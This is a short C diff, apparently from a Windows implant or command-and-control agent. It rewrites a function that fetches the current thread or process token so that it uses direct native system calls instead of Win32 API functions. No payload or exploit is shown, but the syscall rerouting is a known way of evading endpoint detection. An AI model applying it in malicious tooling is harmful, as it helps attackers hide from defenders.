@@ -571,15 +571,18 @@ HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain )
 HANDLE TokenCurrentHandle(
     VOID
 ) {
-    HANDLE Token = NULL;
+    HANDLE   Token    = NULL;
+    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
 
-    /* TODO: use native calls */
-    if ( ! Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &Token ) )
+    if ( ! NT_SUCCESS( ( NtStatus = SysNtOpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &Token ) ) ) )
     {
-        PRINTF( "OpenThreadToken: Failed:[%d]\n", NtGetLastError() );
-        if ( ! Instance.Win32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &Token ) )
+        if ( NtStatus != STATUS_NO_TOKEN )
         {
-            PRINTF( "OpenProcessToken: Failed:[%d]\n", NtGetLastError() );
+            PRINTF( "NtOpenThreadToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        }
+        if ( ! NT_SUCCESS( ( NtStatus = SysNtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &Token ) ) ) )
+        {
+            PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
             return NULL;
         }
     }
